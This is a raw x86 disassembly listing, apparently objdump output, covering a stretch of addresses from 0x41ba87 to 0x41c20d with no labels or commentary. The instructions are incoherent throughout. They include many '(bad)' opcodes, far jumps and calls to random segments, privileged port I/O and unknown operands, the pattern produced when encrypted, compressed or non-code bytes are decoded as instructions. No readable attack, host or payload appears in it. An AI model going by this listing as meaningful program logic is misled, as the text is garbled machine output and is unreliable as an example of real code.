  41ba87:	ss mov ebp,0x5de68bd8
  41ba8d:	jl     0x41bab5
  41ba8f:	pop    esp
  41ba90:	jmp    FWORD PTR [esi+0x7a3790d3]
  41ba96:	(bad)  
  41ba97:	jmp    0x6a9e:0xa8e07a23
  41ba9e:	and    al,0xa6
  41baa0:	lods   al,BYTE PTR ds:[esi]
  41baa1:	jp     0x41baf9
  41baa3:	xor    ecx,ebp
  41baa5:	push   eax
  41baa6:	mov    dl,0xf5
  41baa8:	mov    cl,0xe7
  41baaa:	and    BYTE PTR [ecx-0x4b],ch
  41baad:	mov    esp,0x86bc7e45
  41bab2:	add    dh,BYTE PTR [ebx+0x31d6aaac]
  41bab8:	xor    al,BYTE PTR [edx-0x2aadc1fe]
  41babe:	mov    bh,0x56
  41bac0:	es add esi,edi
  41bac3:	mov    edi,0x7e83b36f
  41bac8:	test   eax,0x9d39a544
  41bacd:	stos   BYTE PTR es:[edi],al
  41bace:	test   DWORD PTR [ebx],edi
  41bad0:	or     DWORD PTR [esi],esi
  41bad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad3:	(bad)  
  41bad4:	pop    esi
  41bad5:	repz fstp TBYTE PTR [eax+0x35]
  41bad9:	jno    0x41bb2c
  41badb:	jge    0x41bb58
  41badd:	mov    ch,0xfe
  41badf:	hlt    
  41bae0:	sub    eax,0xb9d731a8
  41bae5:	dec    ebx
  41bae6:	enter  0x2b1,0xcc
  41baea:	and    BYTE PTR [ebx-0x20eb4cd],ch
  41baf0:	add    eax,0x42489053
  41baf5:	sub    DWORD PTR [ebp-0x34071223],0x14
  41bafc:	inc    esi
  41bafd:	popf   
  41bafe:	sbb    ch,bl
  41bb00:	push   0xffffffb1
  41bb02:	cs jle 0x41baf7
  41bb05:	jne    0x41bb59
  41bb07:	(bad)  
  41bb08:	rcr    DWORD PTR [ecx],cl
  41bb0a:	jmp    0x41bb51
  41bb0c:	and    BYTE PTR [ecx-0x4b],dl
  41bb0f:	mov    eax,0x5803d7a1
  41bb14:	cmp    DWORD PTR [esi-0x3b8236db],0x74
  41bb1b:	leave  
  41bb1c:	xchg   ebp,eax
  41bb1d:	cs repnz std 
  41bb20:	adc    edi,eax
  41bb22:	ret    0x1526
  41bb25:	clc    
  41bb26:	push   cs
  41bb27:	sub    eax,0x6f7e2cc6
  41bb2c:	std    
  41bb2d:	mov    bh,0xa0
  41bb2f:	xchg   ecx,eax
  41bb30:	mov    bh,0x79
  41bb32:	shl    esi,1
  41bb34:	mov    ecx,DWORD PTR [ebx+edx*8-0x10]
  41bb38:	addr16 into 
  41bb3a:	jecxz  0x41bb08
  41bb3c:	fcomp  DWORD PTR cs:[esi]
  41bb3f:	push   ebx
  41bb40:	cdq    
  41bb41:	mov    dh,0xa0
  41bb43:	ins    DWORD PTR es:[edi],dx
  41bb44:	in     al,dx
  41bb45:	mov    ds:0x6cea4207,eax
  41bb4a:	mov    eax,0xdb13f5fb
  41bb4f:	push   esi
  41bb50:	mov    al,0x53
  41bb52:	adc    eax,0x2d33b5fb
  41bb57:	lods   al,BYTE PTR ds:[esi]
  41bb58:	sti    
  41bb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb5a:	xlat   BYTE PTR ds:[ebx]
  41bb5b:	call   FWORD PTR ds:0xbbae0db8
  41bb61:	in     al,0xf
  41bb63:	mov    edi,ebp
  41bb65:	call   0x3a0d:0x74c6d26a
  41bb6c:	ds mov ecx,0x2b8f2aa0
  41bb72:	add    al,0xed
  41bb75:	cdq    
  41bb76:	jg     0x41bb18
  41bb78:	xchg   ecx,eax
  41bb79:	sub    BYTE PTR [ebp-0x15a1891f],cl
  41bb7f:	or     al,BYTE PTR [edx+ebp*1]
  41bb82:	(bad)  
  41bb84:	clc    
  41bb85:	sar    BYTE PTR [ebp-0xf9ea12d],1
  41bb8b:	mov    al,ds:0x77208990
  41bb90:	dec    ebx
  41bb91:	sub    al,0x50
  41bb93:	xchg   esi,eax
  41bb94:	inc    eax
  41bb95:	in     eax,dx
  41bb96:	mov    bl,0xf9
  41bb98:	add    eax,DWORD PTR [esi-0x28]
  41bb9b:	xchg   ecx,eax
  41bb9c:	lods   al,BYTE PTR ds:[esi]
  41bb9d:	mov    al,BYTE PTR [edi+0x1f]
  41bba0:	sar    ebx,1
  41bba2:	out    0x86,eax
  41bba4:	mov    dl,0x49
  41bba6:	xchg   ecx,edx
  41bba8:	xlat   BYTE PTR ds:[ebx]
  41bba9:	mov    ch,0x80
  41bbab:	push   ebp
  41bbac:	mov    dh,0x68
  41bbae:	fdiv   st(2),st
  41bbb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbb1:	xor    DWORD PTR [ecx+0x71],edx
  41bbb4:	mov    ds:0xcb33ba24,eax
  41bbb9:	adc    esi,DWORD PTR [eax]
  41bbbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbbc:	ja     0x41bb94
  41bbbe:	ficom  DWORD PTR [edx+0x6077c323]
  41bbc4:	mov    ds:0xfa919693,eax
  41bbc9:	daa    
  41bbca:	adc    dh,BYTE PTR [edx-0x5a13d1a5]
  41bbd0:	mov    al,ds:0xfeda4e47
  41bbd5:	gs xor al,0x66
  41bbd8:	adc    eax,0xfca3edb9
  41bbdd:	pushf  
  41bbde:	repnz sbb ah,bl
  41bbe1:	cld    
  41bbe2:	popf   
  41bbe3:	fstp   QWORD PTR [esi-0x18]
  41bbe6:	dec    eax
  41bbe7:	cmp    DWORD PTR [eax+ebx*2+0x47],eax
  41bbeb:	mov    esp,0x8e1f70d0
  41bbf0:	jne    0x41bbd6
  41bbf2:	cmp    DWORD PTR [ebp+0x3d],ecx
  41bbf5:	aaa    
  41bbf6:	mov    bh,0x57
  41bbf8:	push   ecx
  41bbf9:	repz inc esp
  41bbfb:	imul   edx,DWORD PTR [esi-0x6a02f3e],0xa1dd66ec
  41bc05:	xchg   edx,eax
  41bc06:	xchg   edx,ebx
  41bc08:	imul   esp,eax,0x11
  41bc0b:	rol    DWORD PTR [ecx+eax*8],0x72
  41bc0f:	sti    
  41bc10:	xor    DWORD PTR [eax-0x3c],esi
  41bc13:	adc    DWORD PTR [edx-0x50],0x6f04eb55
  41bc1a:	jo     0x41bc1e
  41bc1c:	je     0x41bc84
  41bc1e:	add    eax,ebx
  41bc20:	js     0x41bbc5
  41bc22:	mov    bh,0x60
  41bc24:	jge    0x41bc3e
  41bc26:	add    ecx,esi
  41bc28:	inc    ecx
  41bc29:	jp     0x41bc42
  41bc2b:	mov    ecx,0xffe6f32f
  41bc30:	jbe    0x41bc9f
  41bc32:	int3   
  41bc33:	or     BYTE PTR [esi-0x1b78c083],ah
  41bc39:	xchg   ebx,eax
  41bc3a:	mov    ds:0x141f15ba,al
  41bc3f:	rep stos DWORD PTR es:[edi],eax
  41bc41:	xor    dl,ch
  41bc43:	cdq    
  41bc44:	or     ebx,DWORD PTR [esi-0x2c62b470]
  41bc4a:	add    al,0xbf
  41bc4c:	jbe    0x41bbdd
  41bc4e:	out    dx,al
  41bc4f:	enter  0xe2bf,0x10
  41bc53:	sbb    eax,0x20ad424d
  41bc58:	xchg   BYTE PTR [eax+0x53b149be],al
  41bc5e:	retf   0x9c7a
  41bc61:	lock test DWORD PTR [ecx],esi
  41bc64:	stos   DWORD PTR es:[edi],eax
  41bc65:	stc    
  41bc66:	sub    bl,BYTE PTR [esi+0x6d]
  41bc69:	jmp    0x2bac13ce
  41bc6e:	nop
  41bc6f:	jno    0x41bbfc
  41bc71:	(bad)  
  41bc72:	out    dx,al
  41bc73:	jg     0x41bca1
  41bc75:	(bad)  
  41bc76:	lods   eax,DWORD PTR ds:[esi]
  41bc77:	test   BYTE PTR [edi-0x5b],ch
  41bc7a:	nop
  41bc7b:	jle    0x41bcf3
  41bc7d:	mov    ecx,DWORD PTR [ecx-0x4b35d428]
  41bc83:	push   ebp
  41bc84:	lods   eax,DWORD PTR ds:[esi]
  41bc85:	jl     0x41bced
  41bc87:	dec    edx
  41bc88:	imul   ax,WORD PTR [eax+0x6514ff23],0x6b0d
  41bc91:	jmp    0xcf1:0xfdbe412
  41bc98:	inc    edx
  41bc99:	push   ebx
  41bc9a:	mov    edi,0x19850d6d
  41bc9f:	sbb    al,0x61
  41bca1:	setbe  dl
  41bca4:	and    eax,0x2fdd1e05
  41bca9:	ret    0x8828
  41bcac:	push   eax
  41bcad:	clc    
  41bcae:	mov    ch,0xec
  41bcb0:	or     eax,0x64ca8941
  41bcb5:	mov    eax,DWORD PTR [ebp+0x61]
  41bcb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcb9:	and    eax,ebp
  41bcbb:	rol    BYTE PTR [edx],1
  41bcbd:	adc    BYTE PTR [eax],ah
  41bcbf:	enter  0x9f13,0xcf
  41bcc3:	rcl    BYTE PTR [eax+0x78],cl
  41bcc6:	pop    eax
  41bcc7:	sub    dh,BYTE PTR [edi]
  41bcc9:	call   0x4dbc:0xc5b220f8
  41bcd0:	call   0x36d9:0xf5a6d2f1
  41bcd7:	sbb    al,0xda
  41bcd9:	(bad)  
  41bcda:	test   eax,0x56606851
  41bcdf:	cmp    DWORD PTR [ecx-0x1e26b718],eax
  41bce5:	pop    esp
  41bce6:	pop    es
  41bce7:	mov    bl,0xef
  41bce9:	cdq    
  41bcea:	mov    cl,0x7f
  41bcec:	adc    BYTE PTR [ecx-0x7da3c389],cl
  41bcf2:	xor    al,BYTE PTR fs:[esi]
  41bcf5:	cli    
  41bcf6:	mov    WORD PTR [edx+0x9e7712],fs
  41bcfc:	sbb    DWORD PTR [ebx],0x2ecd43dc
  41bd02:	and    ch,bl
  41bd04:	xor    dl,BYTE PTR gs:[ebx*2+0x350e06a9]
  41bd0c:	cmp    eax,0xb27ff412
  41bd11:	lock dec esp
  41bd13:	mov    esp,ds
  41bd15:	ja     0x41bd57
  41bd17:	inc    eax
  41bd18:	ins    BYTE PTR es:[edi],dx
  41bd19:	iret   
  41bd1a:	mov    cl,0xa5
  41bd1c:	sar    BYTE PTR [eax-0x33c9dfb5],0x21
  41bd23:	call   0x430ab224
  41bd28:	push   eax
  41bd29:	lds    ecx,FWORD PTR [esi-0x35]
  41bd2c:	adc    BYTE PTR [ebp+0x13d4d77],bl
  41bd32:	cvtps2pi mm7,QWORD PTR [edi+edi*8]
  41bd36:	xchg   edi,eax
  41bd37:	(bad)  
  41bd38:	push   ds
  41bd39:	in     al,dx
  41bd3a:	lods   al,BYTE PTR fs:[esi]
  41bd3c:	rol    BYTE PTR [ebx+0x3c],cl
  41bd3f:	stos   BYTE PTR es:[edi],al
  41bd40:	or     DWORD PTR [edx-0x65],edx
  41bd43:	xchg   dl,ch
  41bd45:	sub    BYTE PTR [esi+0x5b78289c],ah
  41bd4b:	dec    esp
  41bd4c:	into   
  41bd4d:	mov    ds:0x372cf06a,al
  41bd52:	mov    esp,0xed4174ed
  41bd57:	in     al,0xbe
  41bd59:	push   esi
  41bd5a:	mov    ch,0xaa
  41bd5c:	push   0x9b39bdd6
  41bd61:	or     dl,BYTE PTR [esi+0x2a]
  41bd64:	outs   dx,DWORD PTR ds:[esi]
  41bd65:	and    DWORD PTR [ecx-0x26],ebp
  41bd68:	add    BYTE PTR [edi+0x5f],cl
  41bd6b:	js     0x41bcee
  41bd6d:	or     BYTE PTR [esp+ecx*4-0xb],bh
  41bd71:	jnp    0x41bdcf
  41bd73:	inc    ecx
  41bd74:	mov    ah,0xa8
  41bd76:	fwait
  41bd77:	repnz pop edx
  41bd79:	inc    ebx
  41bd7a:	adc    BYTE PTR ds:0xc2ef5725,ah
  41bd80:	adc    cl,BYTE PTR [eax+0x65]
  41bd83:	pusha  
  41bd84:	ss test al,0xb3
  41bd87:	leave  
  41bd88:	loopne 0x41bd43
  41bd8a:	fucom  st(5)
  41bd8c:	in     al,0x40
  41bd8e:	jns    0x41bd63
  41bd90:	loope  0x41bd7e
  41bd92:	or     ecx,esp
  41bd94:	push   eax
  41bd95:	sbb    ebx,ecx
  41bd97:	repnz sub BYTE PTR ds:0xa3abd5ec,dl
  41bd9e:	sbb    esp,DWORD PTR [edx+0xc]
  41bda1:	xchg   ebx,eax
  41bda2:	outs   dx,BYTE PTR ds:[esi]
  41bda3:	cs mov esp,0x57d4634e
  41bda9:	aam    0x4b
  41bdab:	ret    
  41bdac:	jmp    0x3c8f:0x7610edd
  41bdb3:	pop    ebp
  41bdb4:	push   ebx
  41bdb5:	int    0x9b
  41bdb7:	xchg   edi,eax
  41bdb8:	inc    esi
  41bdb9:	stc    
  41bdba:	push   edx
  41bdbb:	into   
  41bdbc:	fs cwde 
  41bdbe:	xor    esi,ebx
  41bdc0:	pop    edi
  41bdc1:	stos   DWORD PTR es:[edi],eax
  41bdc2:	lahf   
  41bdc3:	and    BYTE PTR [ecx-0x1b],dl
  41bdc6:	fdivr  QWORD PTR [edi-0x5570dec6]
  41bdcc:	mov    esi,0x420f33ec
  41bdd1:	mov    dl,0x7a
  41bdd3:	mov    edx,0xca4bf86b
  41bdd8:	cmp    DWORD PTR [edx+0x2c893988],0x4857a520
  41bde2:	or     bl,BYTE PTR [ebp+edx*8+0x7d30cf7b]
  41bde9:	aam    0x79
  41bdeb:	push   edi
  41bdec:	ja     0x41be3a
  41bdee:	daa    
  41bdef:	lods   al,BYTE PTR ds:[esi]
  41bdf0:	sub    BYTE PTR [edi+eax*2+0x42],bh
  41bdf4:	test   BYTE PTR [eax-0x544e7371],ah
  41bdfa:	push   cs
  41bdfb:	stc    
  41bdfc:	fcomp  QWORD PTR [edx]
  41bdfe:	adc    eax,0xbe9c890c
  41be03:	jmp    0x41bd98
  41be05:	test   ebx,eax
  41be07:	bound  esp,QWORD PTR ds:0x6a0bb3bf
  41be0d:	lods   al,BYTE PTR ds:[esi]
  41be0e:	sub    al,0x70
  41be10:	push   ds
  41be11:	stc    
  41be12:	int3   
  41be13:	jle    0x41bd95
  41be15:	lock scas al,BYTE PTR es:[edi]
  41be17:	pop    es
  41be18:	add    al,0x3f
  41be1a:	loopne 0x41be36
  41be1c:	mov    esp,0x135b0376
  41be21:	or     DWORD PTR [ebp+esi*2-0x3e3320e],esp
  41be28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be29:	call   0x2ed1:0xd43a7a3f
  41be30:	inc    ecx
  41be31:	loope  0x41be63
  41be33:	shl    DWORD PTR [esi-0x2782de5b],1
  41be39:	inc    esi
  41be3a:	inc    edx
  41be3b:	xor    ebp,0xbd1d90e3
  41be41:	(bad)  
  41be42:	imul   eax,DWORD PTR [esi+0x4b],0x9a16d082
  41be49:	sar    BYTE PTR [edx-0x33],1
  41be4c:	jnp    0x41bdf7
  41be4e:	xchg   DWORD PTR [ecx],eax
  41be50:	adc    BYTE PTR [ecx-0x2f],dl
  41be53:	jns    0x41be3d
  41be55:	jmp    0x41beab
  41be57:	call   0xcd40:0x671f0759
  41be5e:	pop    edx
  41be5f:	(bad)  
  41be60:	(bad)  
  41be61:	mov    dh,0x23
  41be63:	mov    gs,WORD PTR [edi+edx*8]
  41be66:	repnz fist WORD PTR [ebp+0x29]
  41be6a:	jmp    0x41bdee
  41be6c:	cwde   
  41be6d:	jl     0x41bed7
  41be6f:	adc    edi,esi
  41be71:	jno    0x41bec4
  41be73:	hlt    
  41be74:	into   
  41be75:	fcomp  QWORD PTR [edx+0x5409fd30]
  41be7b:	ret    0xfa73
  41be7e:	outs   dx,DWORD PTR ds:[esi]
  41be7f:	mov    ah,0x14
  41be81:	nop
  41be82:	mov    ch,0x73
  41be84:	call   0x2c51:0x37b25b07
  41be8b:	js     0x41beec
  41be8d:	inc    ebp
  41be8e:	push   0x7bf7d83c
  41be93:	and    esi,eax
  41be95:	jmp    0x2ec4:0x9ca82e2c
  41be9c:	mov    cl,0xc2
  41be9e:	sahf   
  41be9f:	cmc    
  41bea0:	out    dx,eax
  41bea1:	jne    0x41be4f
  41bea3:	mov    edi,0xe186837f
  41bea8:	add    BYTE PTR [esi+0x4d5e0781],0xe8
  41beaf:	sti    
  41beb0:	sti    
  41beb1:	mov    ebx,DWORD PTR [esi-0x9]
  41beb4:	push   ss
  41beb5:	xor    edx,ebp
  41beb7:	mov    cl,0xe
  41beb9:	xor    cl,BYTE PTR [ecx-0x74]
  41bebc:	cwde   
  41bebd:	mov    bh,dl
  41bebf:	xchg   edx,eax
  41bec0:	adc    al,0xfc
  41bec2:	icebp  
  41bec3:	leave  
  41bec4:	push   cs
  41bec5:	dec    ebp
  41bec6:	pop    ecx
  41bec7:	dec    edi
  41bec8:	cmp    BYTE PTR [esi-0x4b],bl
  41becb:	(bad)  
  41becc:	clc    
  41becd:	xor    eax,0x8fd2b783
  41bed2:	push   ds
  41bed3:	xchg   edi,eax
  41bed4:	data16 ja 0x41be7e
  41bed7:	repnz push di
  41beda:	or     bl,ch
  41bedc:	cmp    edx,ebp
  41bede:	mov    esp,0x5e1b7cf1
  41bee3:	pop    ebx
  41bee4:	cmp    ah,BYTE PTR [edi+0x76]
  41bee7:	and    edx,esp
  41bee9:	std    
  41beea:	ins    BYTE PTR es:[edi],dx
  41beeb:	pushf  
  41beec:	jo     0x41bf4f
  41beee:	and    BYTE PTR ds:0x54dc8c05,ah
  41bef4:	cmp    eax,edx
  41bef6:	pop    es
  41bef7:	in     eax,dx
  41bef8:	ss mov di,0x4d8f
  41befd:	pop    ebx
  41befe:	shr    DWORD PTR [ebx+0x40],cl
  41bf01:	dec    ebx
  41bf02:	sti    
  41bf03:	jge    0x41beda
  41bf05:	ds js  0x41bf09
  41bf08:	test   DWORD PTR [ebx+edx*2-0x8a70c99],0x6fa43baa
  41bf13:	sub    BYTE PTR [edx-0x50c12230],bl
  41bf19:	ja     0x41beaa
  41bf1b:	dec    edi
  41bf1c:	or     al,0x7
  41bf1e:	imul   edx,DWORD PTR [edi],0xffffffb9
  41bf21:	or     eax,0x2a88724a
  41bf26:	fst    DWORD PTR [edi+0x27]
  41bf29:	inc    esi
  41bf2a:	jmp    0x41bf0b
  41bf2c:	and    ch,BYTE PTR [ebx+0x5b]
  41bf2f:	add    ch,ch
  41bf31:	ins    BYTE PTR es:[edi],dx
  41bf32:	sbb    BYTE PTR ds:0xa516a8ca,dh
  41bf38:	mov    DWORD PTR [ebp-0x46],ebx
  41bf3b:	mov    bh,0x6c
  41bf3d:	retf   0x7209
  41bf40:	xchg   esp,eax
  41bf41:	xchg   esi,eax
  41bf42:	mov    ecx,0xa8102dbd
  41bf47:	or     DWORD PTR [eax+0x32e3b4fd],ebp
  41bf4d:	push   ds
  41bf4e:	xlat   BYTE PTR ds:[ebx]
  41bf4f:	sub    al,0x0
  41bf51:	mov    ebx,0x63224f64
  41bf56:	xchg   DWORD PTR [esi-0x80194b3],esi
  41bf5c:	and    DWORD PTR [edx],esp
  41bf5e:	dec    edx
  41bf5f:	push   0xfffffff0
  41bf61:	mov    edx,0xdd3abdba
  41bf66:	xchg   edx,eax
  41bf67:	imul   esp,eax,0xee579097
  41bf6d:	dec    ecx
  41bf6e:	add    DWORD PTR [edx+0x4e],ecx
  41bf71:	or     eax,0xa4380356
  41bf76:	cmp    BYTE PTR [ecx],bl
  41bf78:	pop    esi
  41bf79:	imul   edx,DWORD PTR [ebx+esi*8-0x71edd9c3],0x9ac69e4a
  41bf84:	inc    ebx
  41bf85:	pop    eax
  41bf86:	push   ebp
  41bf88:	ss sbb al,0xfd
  41bf8b:	mov    dh,0x8e
  41bf8d:	dec    ebp
  41bf8e:	jns    0x41bf95
  41bf90:	aas    
  41bf91:	mov    bl,BYTE PTR [ebx]
  41bf93:	into   
  41bf94:	lods   eax,DWORD PTR ds:[esi]
  41bf95:	test   eax,0x3eb27115
  41bf9a:	dec    eax
  41bf9b:	ret    0x5b3e
  41bf9e:	stos   DWORD PTR es:[edi],eax
  41bf9f:	out    dx,al
  41bfa0:	and    ch,BYTE PTR [ecx+esi*8+0x5b]
  41bfa4:	mov    dl,bh
  41bfa6:	daa    
  41bfa7:	sub    dl,BYTE PTR [esi-0x5fc1b95a]
  41bfad:	or     al,0x4b
  41bfaf:	es inc esp
  41bfb1:	jmp    0xfd70:0x562ae996
  41bfb8:	je     0x41bfd5
  41bfba:	and    eax,0x1e2c156
  41bfbf:	cli    
  41bfc0:	sbb    dh,al
  41bfc2:	jmp    0x41c020
  41bfc4:	pushf  
  41bfc5:	jnp    0x41bfc9
  41bfc7:	dec    esi
  41bfc8:	and    ecx,DWORD PTR [eax+0x38]
  41bfcb:	les    esp,FWORD PTR [ebx]
  41bfcd:	(bad)  
  41bfcf:	pop    ecx
  41bfd0:	retf   
  41bfd1:	mov    ?,WORD PTR [ecx-0x77984d2c]
  41bfd7:	add    DWORD PTR [edx+0x3592cf71],edi
  41bfdd:	lods   eax,DWORD PTR ds:[esi]
  41bfde:	fsub   QWORD PTR [ecx+0x1]
  41bfe1:	and    ebp,ebp
  41bfe3:	pop    esp
  41bfe4:	lea    ecx,[eax+0x48]
  41bfe7:	mov    BYTE PTR [ecx],bh
  41bfe9:	xor    edx,ebx
  41bfeb:	test   BYTE PTR [ebx+0x4a36ec68],dh
  41bff1:	lahf   
  41bff2:	out    dx,al
  41bff3:	push   ebp
  41bff4:	ror    DWORD PTR ds:0xe0b46709,cl
  41bffa:	pop    edi
  41bffb:	push   0xffffff8d
  41bffd:	jb     0x41c067
  41bfff:	inc    esi
  41c000:	sbb    BYTE PTR [edi+0x74804008],0x40
  41c007:	add    BYTE PTR [ebx],dh
  41c009:	mov    esi,0x7a625ecd
  41c00e:	inc    ecx
  41c00f:	test   BYTE PTR [edx+esi*1+0x9f9b7a1],0x6b
  41c017:	xlat   BYTE PTR ds:[ebx]
  41c018:	cmp    al,0xe8
  41c01a:	bound  ebx,QWORD PTR [edx+0x6d679f6f]
  41c020:	pop    es
  41c021:	fisubr WORD PTR [esi+0x17ea657d]
  41c027:	ret    
  41c028:	or     cl,bh
  41c02a:	xor    BYTE PTR [edx],0x62
  41c02d:	adc    al,0x5
  41c02f:	add    al,0x13
  41c031:	nop
  41c032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c033:	pop    edx
  41c034:	(bad)  
  41c035:	pop    ss
  41c036:	add    DWORD PTR [esi+0x6b7f2648],0xb7499ee2
  41c040:	or     eax,0xe23dfb5a
  41c045:	pop    edx
  41c046:	arpl   sp,di
  41c048:	inc    eax
  41c049:	sub    DWORD PTR [ebx-0x1d7a0260],ecx
  41c04f:	fisttp WORD PTR [ecx+0x1ef77ac8]
  41c055:	ficom  DWORD PTR [ebx+ecx*4-0x3ecee85e]
  41c05c:	xchg   ecx,eax
  41c05d:	sbb    BYTE PTR [esi+0x6b],dh
  41c060:	gs out dx,eax
  41c062:	push   ebx
  41c063:	jle    0x41c082
  41c065:	fidivr DWORD PTR [eax+ebx*4]
  41c068:	cmc    
  41c069:	push   esi
  41c06a:	xchg   ecx,eax
  41c06b:	dec    eax
  41c06c:	sub    esp,0x35c3039
  41c072:	je     0x41c035
  41c074:	ja     0x41c0c4
  41c076:	cdq    
  41c077:	sbb    edi,eax
  41c079:	aas    
  41c07a:	cmovbe edx,DWORD PTR [edx+0x2f155aaf]
  41c081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c082:	call   0xcc587574
  41c087:	ins    DWORD PTR es:[edi],dx
  41c088:	push   ss
  41c089:	les    esi,FWORD PTR [edi-0x60]
  41c08c:	add    ebx,eax
  41c08e:	adc    eax,0xc1adb163
  41c093:	fs pusha 
  41c095:	aam    0xee
  41c097:	cmp    eax,0x3486af3b
  41c09c:	repnz or bl,BYTE PTR [ecx-0x77eeb695]
  41c0a3:	inc    ebp
  41c0a4:	xor    edi,edi
  41c0a6:	retf   0x6725
  41c0a9:	das    
  41c0aa:	mov    bh,0xf5
  41c0ac:	mov    al,0x1e
  41c0ae:	data16 repz (bad) 
  41c0b1:	mov    esp,0x3e9e582
  41c0b6:	xlat   BYTE PTR ds:[ebx]
  41c0b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0b8:	fstp   TBYTE PTR [ecx]
  41c0ba:	retf   
  41c0bb:	push   ebx
  41c0bc:	pop    eax
  41c0bd:	mov    dl,0xda
  41c0bf:	repz pop ebp
  41c0c1:	mov    al,ch
  41c0c3:	push   eax
  41c0c4:	sbb    DWORD PTR [esi+ebp*4],ecx
  41c0c7:	inc    ebp
  41c0c8:	call   0xf451:0xbc972702
  41c0cf:	aam    0xeb
  41c0d1:	push   cs
  41c0d2:	sbb    DWORD PTR [edi],edx
  41c0d4:	(bad)  
  41c0d6:	push   0x1f
  41c0d8:	dec    eax
  41c0d9:	sbb    DWORD PTR [edx+0x28],0x57
  41c0dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0de:	(bad)  [edx+0x75]
  41c0e1:	neg    al
  41c0e3:	(bad)  
  41c0e4:	lock test BYTE PTR [edi+0x4],0xa4
  41c0e9:	pop    edi
  41c0ea:	mov    edi,0xdb8a49d4
  41c0ef:	mov    ebx,0xe5c0a21c
  41c0f4:	retf   
  41c0f5:	cmc    
  41c0f6:	cld    
  41c0f7:	pop    DWORD PTR [eax]
  41c0f9:	xor    dl,BYTE PTR [ebp+0x3e5bdc1]
  41c0ff:	inc    ecx
  41c100:	push   edi
  41c101:	(bad)  
  41c102:	cwde   
  41c103:	jg     0x41c0be
  41c105:	sub    BYTE PTR [ecx],ah
  41c107:	jae    0x41c0cc
  41c109:	sbb    ecx,ebp
  41c10b:	or     bh,bl
  41c10d:	pop    eax
  41c10e:	push   edi
  41c10f:	retf   
  41c110:	test   eax,0xd5c76f5e
  41c115:	inc    edx
  41c116:	mov    ds:0x552b4577,al
  41c11b:	pop    edi
  41c11c:	xor    edi,DWORD PTR [ebx]
  41c11e:	ins    BYTE PTR es:[edi],dx
  41c11f:	adc    BYTE PTR [ebx],dl
  41c121:	test   eax,0x16799ee1
  41c126:	xor    al,0x7f
  41c128:	rcr    DWORD PTR [edi],1
  41c12a:	pop    ebp
  41c12b:	xchg   ebx,eax
  41c12c:	scas   eax,DWORD PTR es:[edi]
  41c12d:	add    BYTE PTR [ecx-0x67404f43],0x7c
  41c134:	clc    
  41c135:	shr    BYTE PTR [ebx],cl
  41c137:	lods   al,BYTE PTR ds:[esi]
  41c138:	adc    eax,0x67291e44
  41c13d:	js     0x41c15e
  41c13f:	call   0xb14c3d60
  41c144:	sub    eax,0x5cafce33
  41c149:	inc    edi
  41c14a:	mov    BYTE PTR [ebx+eiz*4-0x75ce262d],0x79
  41c152:	sete   BYTE PTR [edx+0x5f]
  41c156:	(bad)  
  41c157:	sti    
  41c158:	or     DWORD PTR [ecx-0x7c],edi
  41c15b:	xchg   ecx,eax
  41c15c:	pop    eax
  41c15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c15e:	imul   eax,DWORD PTR es:[esi-0x33837f98],0x4378039e
  41c169:	test   BYTE PTR [eax],al
  41c16b:	popa   
  41c16c:	inc    esi
  41c16d:	(bad)  
  41c16e:	loope  0x41c101
  41c170:	es int3 
  41c172:	aas    
  41c173:	push   0xffffffa9
  41c175:	mov    WORD PTR [esi+0x165bd602],?
  41c17b:	sub    ch,cl
  41c17d:	(bad)  
  41c17e:	aaa    
  41c17f:	push   edi
  41c180:	add    bl,BYTE PTR [edi]
  41c182:	cdq    
  41c183:	push   edi
  41c184:	jae    0x41c1d7
  41c186:	repnz rol BYTE PTR ds:0xdc1b11d6,0xec
  41c18e:	and    ecx,edx
  41c190:	(bad)  
  41c191:	dec    esp
  41c192:	sbb    BYTE PTR [eax],cl
  41c194:	jo     0x41c1c1
  41c196:	inc    edx
  41c197:	retf   
  41c198:	adc    eax,0x2462aea7
  41c19d:	jmp    0x41c1eb
  41c19f:	ret    
  41c1a0:	(bad)  
  41c1a1:	fcomp  QWORD PTR [ecx]
  41c1a3:	dec    edi
  41c1a4:	stos   DWORD PTR es:[edi],eax
  41c1a5:	dec    edi
  41c1a6:	out    0x65,eax
  41c1a8:	pushf  
  41c1a9:	jb     0x41c18e
  41c1ab:	inc    eax
  41c1ac:	lock sub BYTE PTR [edi],ah
  41c1af:	push   ebp
  41c1b0:	push   ds
  41c1b1:	daa    
  41c1b2:	mov    esi,0x1f7d2b71
  41c1b7:	outs   dx,BYTE PTR ds:[esi]
  41c1b8:	push   eax
  41c1b9:	stos   DWORD PTR es:[edi],eax
  41c1ba:	sub    eax,0x98e7da3d
  41c1bf:	dec    esi
  41c1c0:	dec    edi
  41c1c1:	push   ebp
  41c1c2:	in     eax,dx
  41c1c3:	es jbe 0x41c1a8
  41c1c6:	xor    dl,cl
  41c1c8:	rol    BYTE PTR [edi],cl
  41c1ca:	test   eax,0x3467e548
  41c1cf:	cli    
  41c1d0:	sub    DWORD PTR [esi-0x33],0x17
  41c1d4:	add    BYTE PTR [eax-0x2acbe990],ch
  41c1da:	push   es
  41c1db:	out    0xc5,eax
  41c1dd:	xor    DWORD PTR ds:0x1371da30,ecx
  41c1e3:	bound  ebp,QWORD PTR [ecx+ecx*4+0x18]
  41c1e7:	lods   al,BYTE PTR ds:[esi]
  41c1e8:	shl    BYTE PTR [eax+0x1235f4a],cl
  41c1ee:	add    ebx,DWORD PTR [ebx+edi*1-0x5d7257a5]
  41c1f5:	sbb    ebp,edx
  41c1f7:	cld    
  41c1f8:	sbb    ah,BYTE PTR [esi]
  41c1fa:	je     0x41c17e
  41c1fc:	xchg   DWORD PTR [ecx+edx*4+0x3c70725f],ebx
  41c203:	shl    dl,0xad
  41c206:	jmp    0x41c260
  41c208:	jne    0x41c269
  41c20a:	or     BYTE PTR [esi],ch
  41c20c:	xchg   edi,eax
  41c20d:	rol    esi,1
